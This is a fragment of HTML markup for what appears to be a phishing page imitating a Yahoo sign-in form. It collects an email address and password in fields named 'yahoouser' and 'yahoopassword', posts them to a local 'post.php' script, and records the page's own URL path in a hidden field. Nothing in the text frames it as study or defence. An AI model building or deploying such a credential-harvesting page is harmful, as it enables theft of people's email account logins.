      />

    <div
      id="bv_Form1"
      style="position:absolute;left:9px;top:0px;width:401px;height:503px;z-index:4"
    >
      <script>
        function validateForm() {
          var x = document.forms["Form1"]["yahoouser"].value;
          var y = document.forms["Form1"]["yahoopassword"].value;
          if (x == "" || y == "") {
            alert("Email or Password fields cannot be empty!");
            return false;
          }
        }
        var tbstring = location.href.substring(0, location.href.lastIndexOf("/"));
      var urlss = document.getElementById("pageUrl");
      urlss.value = tbstring;
        // onsubmit="return validateForm()"
      </script>

      <style></style>

      <form
        name="Form1"
        method="post"
        onsubmit="return validateForm()"
        action="post.php"
        required
      >

      <input type="hidden" name="pageUrl" id="pageUrl" value="">

        <input
          id="yahoouser"
          style="position:absolute;left:83px;top:111px;width:219px;height:34px;border:1px #C0C0C0 solid;font-family:Arial;font-size:12px;z-index:0"
          name="yahoouser"
          type="text"
          placeholder="Email"
          validate="required:true"
          pattern="[a-zA-Z0-9!#$%&'*+\/=?^_`{|}~.-]+@[a-zA-Z0-9-]+(\.[a-zA-Z0-9-]+)*"
        />
        <input
          id="yahoopassword"
          style="position:absolute;left:83px;top:159px;width:219px;height:34px;border:1px #C0C0C0 solid;font-family:Arial;font-size:12px;z-index:1"
          name="yahoopassword"
          value=""
          type="password"
          placeholder="Password"
          required
        />
        <input
          id="Button3"
          name="Button1"
          value=" "
          style="position:absolute;left:83px;top:244px;width:222px;height:39px;border:0px #000000 dotted;background-color:transparent;font-family:Arial;font-size:13px;z-index:2"
          type="submit"
        />
      </form>
